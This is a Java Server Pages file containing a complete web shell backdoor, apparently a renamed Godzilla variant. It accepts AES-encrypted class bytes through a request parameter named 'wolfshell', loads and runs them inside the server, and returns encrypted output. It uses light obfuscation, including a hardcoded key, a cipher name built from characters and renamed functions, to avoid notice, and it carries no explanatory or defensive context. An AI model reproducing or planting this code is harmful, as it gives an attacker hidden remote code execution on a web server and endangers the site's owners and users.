<%! String k_str_1 = "3c6e0b8a9c15224a"; String p_str_2="wolfshell"; String m_str_3=do_md5(p_str_2+k_str_1); class L_cls_a extends ClassLoader{public L_cls_a(ClassLoader z){super(z);}public Class do_q(byte[] cb){return super.defineClass(cb, 0, cb.length);}} public byte[] do_x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(new String(new char[]{'A','E','S'}));c.init(m?3-2:4-2,new javax.crypto.spec.SecretKeySpec(k_str_1.getBytes(),new String(new char[]{'A','E','S'})));return c.doFinal(s); }catch (Exception e){return null; }} public static String do_md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String b64_enc(byte[] bs) throws Exception {Class b;String v = null;try {b=Class.forName("java.util.Base64");Object e = b.getMethod("getEncoder", null).invoke(b, null);v = (String)e.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(e, new Object[] { bs });} catch (Exception e) {try { b=Class.forName("sun.misc.BASE64Encoder"); Object enc = b.newInstance(); v = (String)enc.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(enc, new Object[] { bs });} catch (Exception e2) {}}return v; } public static byte[] b64_dec(String bs) throws Exception {Class b;byte[] v = null;try {b=Class.forName("java.util.Base64");Object d = b.getMethod("getDecoder", null).invoke(b, null);v = (byte[])d.getClass().getMethod("decode", new Class[] { String.class }).invoke(d, new Object[] { bs });} catch (Exception e) {try { b=Class.forName("sun.misc.BASE64Decoder"); Object dec = b.newInstance(); v = (byte[])dec.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(dec, new Object[] { bs });} catch (Exception e2) {}}return v; }%><%try{byte[] d1=b64_dec(request.getParameter(p_str_2));d1=do_x(d1, false);String p_key = "payload";if (session.getAttribute(p_key)==null){session.setAttribute(p_key,new L_cls_a(this.getClass().getClassLoader()).do_q(d1));}else{request.setAttribute("parameters",d1);java.io.ByteArrayOutputStream o=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(p_key)).newInstance();f.equals(o);f.equals(pageContext);response.getWriter().write(m_str_3.substring(0,16));f.toString();response.getWriter().write(b64_enc(do_x(o.toByteArray(), true)));response.getWriter().write(m_str_3.substring(16));}}catch (Exception e){}
%>